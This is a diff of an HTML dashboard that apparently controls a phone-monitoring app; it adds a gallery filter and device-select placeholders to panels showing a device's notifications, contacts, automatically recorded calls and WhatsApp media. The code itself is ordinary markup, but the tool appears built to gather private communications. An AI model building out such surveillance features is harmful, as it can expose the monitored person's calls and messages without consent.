@@ -282,6 +282,10 @@
           <span id="galleryCount" style="color:var(--text-secondary);font-size:14px"></span>
         </div>
 
+        <div id="galleryCategoryFilters" class="category-filters" style="display:none;margin-bottom:16px;flex-wrap:wrap;gap:8px">
+          <button class="category-btn active" data-category="all" onclick="filterGalleryCategory('all', this)">All</button>
+        </div>
+
         <div class="gallery-grid" id="galleryGrid">
           <div class="empty-state" style="padding:60px 20px">
             <div class="icon">🖼️</div>
@@ -435,7 +439,9 @@
             <h2>Notifications</h2>
             <p class="subtitle">All notifications from device (WhatsApp, Instagram, etc.)</p>
           </div>
-          <select id="notificationsDeviceSelect" class="device-select" onchange="onNotificationsDeviceChange()"></select>
+          <select id="notificationsDeviceSelect" class="select-device" onchange="onNotificationsDeviceChange()">
+            <option value="">Select a device...</option>
+          </select>
         </div>
 
         <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
@@ -459,7 +465,9 @@
             <h2>Contacts</h2>
             <p class="subtitle">All contacts from device</p>
           </div>
-          <select id="contactsDeviceSelect" class="device-select" onchange="onContactsDeviceChange()"></select>
+          <select id="contactsDeviceSelect" class="select-device" onchange="onContactsDeviceChange()">
+            <option value="">Select a device...</option>
+          </select>
         </div>
 
         <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
@@ -483,7 +491,9 @@
             <h2>Call Recordings</h2>
             <p class="subtitle">Automatically recorded phone calls</p>
           </div>
-          <select id="recordingsDeviceSelect" class="device-select" onchange="onRecordingsDeviceChange()"></select>
+          <select id="recordingsDeviceSelect" class="select-device" onchange="onRecordingsDeviceChange()">
+            <option value="">Select a device...</option>
+          </select>
         </div>
 
         <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
@@ -507,7 +517,9 @@
             <h2>WhatsApp Media</h2>
             <p class="subtitle">Photos, videos, and documents from WhatsApp</p>
           </div>
-          <select id="whatsappDeviceSelect" class="device-select" onchange="onWhatsappDeviceChange()"></select>
+          <select id="whatsappDeviceSelect" class="select-device" onchange="onWhatsappDeviceChange()">
+            <option value="">Select a device...</option>
+          </select>
         </div>
 
         <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
